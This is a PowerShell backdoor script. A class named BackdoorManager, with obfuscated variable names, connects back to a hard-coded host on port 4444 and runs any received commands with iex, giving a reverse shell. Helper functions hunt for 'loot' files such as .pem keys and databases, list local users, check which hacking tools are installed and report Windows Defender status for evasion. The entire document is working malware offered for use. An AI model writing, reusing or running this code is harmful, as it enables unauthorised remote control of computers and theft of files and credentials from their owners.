function get_tools() {
    $tools = @("nmap -h", "nc -h", "wireshark -v", "python3 -V", 
    "python -V", "perl -V", "ruby -h", "hashcat -h", "john -h", 
    "airmon-ng -h", "wifite -h", "sqlmap -h", "ssh", "gdb -h", 
    "radare2 -h", "dig -h", "whois -h", "gcc")
    if ($help -eq "--help") {
        return "Checks to see what tools are installed on the system"
    }
    $lines = ""
    foreach ($tool in $tools) {
        try {
            iex $tool | Out-Null
            $tool = $tool.Split(" ")[0]
            $lines += "[+] $tool is installed`n"
        } catch {

        }
    }
    return $lines

}

function get_loot($directory, $help) {
     if ($help -eq "--help" -or $directory -eq $null) {
        return "Searches a directory for intresting files (takes a while) nsyntax: get_loot --directory C:\"
    }
    $lines = ''
    $fileNames = Get-ChildItem $directory -Recurse -Include *.doc, *.pdf, *.json, *.pem, *.xlsx, *.xls, *.csv, *.txt ,*.db, *.exe
    foreach ($f in $fileNames) {
        $filename = $f.FullName
        $lines += "$filename `n"
    }
    return $lines
}

function get_users($help) {
    if ($help -eq "--help") {
        return "Lists all local users on the computer"
    }

    return Get-LocalUser | Select * | Out-String
}

function get_public_ip($help) {
    if ($help -eq "--help") {
        return "Makes a network request to api.ipify.org to fetch the computers public IP address"
    }
    return (Invoke-WebRequest -uri "https://api.ipify.org/").Content | Out-String
}

function get_bios($help) {
    if ($help -eq "--help") {
        return "Gets the BIOS's manufacturer name, bios name, and firmware type"
    }
    return  Get-ComputerInfo | select BiosManufacturer, BiosName, BiosFirmwareType  | Out-String
}

function get_active($help) {
     if ($help -eq "--help") {
        return "Lists active TCP connections"
    }   
    return Get-NetTCPConnection -State Listen  | Out-String
}

function get_os($help) {
     if ($help -eq "--help") {
        return "Gets infomation about the current OS build"
    }  
    return  Get-ComputerInfo | Select OsManufacturer, OsArchitecture, OsName, OSType, OsHardwareAbstractionLayer, WindowsProductName, WindowsBuildLabEx | Out-String
}


function get_antivirus($help) {
     if ($help -eq "--help") {
        return "Gets infomation about Windows Defender"
    } 
    return  Get-MpComputerStatus | Select AntivirusEnabled, AMEngineVersion, AMProductVersion, AMServiceEnabled, AntispywareSignatureVersion, AntispywareEnabled, IsTamperProtected, IoavProtectionEnabled, NISSignatureVersion, NISEnabled, QuickScanSignatureVersion, RealTimeProtectionEnabled, OnAccessProtectionEnabled, DefenderSignaturesOutOfDate | Out-String

}

function get_file($remote, $local, $help) {
     if ($help -eq "--help" -or $local -eq $null -or $remote -eq $null) {
        return "Downloads a remote file and saves it to your computer `nsyntax: get_file <remote_path> <local_path>`nPlease use absolute paths!"
    }
    try {
        $ASQlvVgJPFgoQ = Get-Content -Path $remote
    } catch {
        $e = $_.Exception
        $msg = $e.Message
        $VcJVUIxrV = "`n$msg`n" 
        return $VcJVUIxrV 
    }
    return $ASQlvVgJPFgoQ
}

function print_help() {
    return "
    get_antivirus - Gets infomation about Windows Defender
    get_os        - Gets infomation about the current OS build
    get_active    - Lists active TCP connections
    get_bios      - Gets the BIOS's manufacturer name, bios name, and firmware type
    get_public_ip - Makes a network request to api.ipify.org to and returns the computers public IP address
    get_loot      - Searches a directory for intresting files --help (syntax)
    get_tools     - Checks to see what tools are installed on the system
    get_file      - Downloads a remote file and saves it to your computer --help (syntax)
    "
}

class BackdoorManager {
    
    # !!!!  DO NOT CHANGE THIS RUN backdoor.py !!!!
    [string]$zGVdlSVtNF = "192.168.0.223"
    # !!!!  DO NOT CHANGE THIS RUN backdoor.py !!!!
    [int]$NXMaguXKlhZSQS = 4444

    $nqRzABjGESWxLtwHyYnzJew 
    $FvBZfb
    $wUgRTlzOwdXKFKUgULyzxsuW
    $DEElNdqiNgRkTvJeABmNqk
    $wGxlMVWWBisVpKgIIj
    $LCUEWvAlSusKwZD
    [int]$XXMPmCIZEBRVpXILIsI = 50*1024

    PEcpJCRVTDrLWsVnIn() {
        $this.FvBZfb = New-Object Net.Sockets.TcpClient($this.zGVdlSVtNF, $this.NXMaguXKlhZSQS);
        $this.nqRzABjGESWxLtwHyYnzJew = $this.FvBZfb.GetStream();
        $this.DEElNdqiNgRkTvJeABmNqk = New-Object Byte[] $this.XXMPmCIZEBRVpXILIsI;
        $this.LCUEWvAlSusKwZD = New-Object Text.UTF8Encoding;
        $this.wUgRTlzOwdXKFKUgULyzxsuW = New-Object IO.StreamWriter($this.nqRzABjGESWxLtwHyYnzJew, [Text.Encoding]::UTF8, $this.XXMPmCIZEBRVpXILIsI);
        $this.wGxlMVWWBisVpKgIIj = New-Object System.IO.StreamReader($this.nqRzABjGESWxLtwHyYnzJew)
        $this.wUgRTlzOwdXKFKUgULyzxsuW.AutoFlush = $true;
        $this.mUotojTGxWPeR()

    }

    uDsNpsEltichqgit($ASQlvVgJPFgoQ) {
        [byte[]]$bytes  = [text.Encoding]::Ascii.GetBytes($ASQlvVgJPFgoQ)
        $this.wUgRTlzOwdXKFKUgULyzxsuW.Write($bytes,0,$bytes.length)     
    }

    mUotojTGxWPeR() {
        $this.uDsNpsEltichqgit("
     /| 
    / |ejm
   /__|______
  |  __  __  |
  | |  ||  | | 
  | |__||__| |== sh!
  |  __  __()|/      ...I'm not really here.
  | |  ||  | |       
  | |  ||  | |       [*] Use print_help to show all commands
  | |__||__| |       [*] Today's Date: $(date)
  |__________|`n`n")
        while ($this.FvBZfb.Connected) {
            $QiudKbN = [Environment]::UserName
            $ArhVp = [System.Net.Dns]::GetHostName()
            $CEGDWMUIkhWeetgnpR = Get-Location
            $UAaQoDQicDU = "$QiudKbN@$ArhVp [$CEGDWMUIkhWeetgnpR]~$ "
            $this.uDsNpsEltichqgit($UAaQoDQicDU)         
            $qrknyVYkmPhEmNTrUVH = $this.nqRzABjGESWxLtwHyYnzJew.Read($this.DEElNdqiNgRkTvJeABmNqk, 0, $this.XXMPmCIZEBRVpXILIsI)    
            $dRhvjBHYxThPbuFVzhTXQ = ($this.LCUEWvAlSusKwZD.GetString($this.DEElNdqiNgRkTvJeABmNqk, 0, $qrknyVYkmPhEmNTrUVH))
            $VcJVUIxrV = "`n"
            if ([string]::IsNullOrEmpty($dRhvjBHYxThPbuFVzhTXQ)) {
                continue
            }
            try { 
                $VcJVUIxrV = iex $dRhvjBHYxThPbuFVzhTXQ | Out-String
                $this.uDsNpsEltichqgit($VcJVUIxrV + "`n")
            } catch {
                $e = $_.Exception
                $msg = $e.Message
                $VcJVUIxrV = "`n$msg`n"  
                $this.uDsNpsEltichqgit($VcJVUIxrV + "`n")
            }
            $this.nqRzABjGESWxLtwHyYnzJew.Flush()
        }
            $this.FvBZfb.Close()
    }     
}

$backdoor = [BackdoorManager]::new()
$backdoor.PEcpJCRVTDrLWsVnIn()
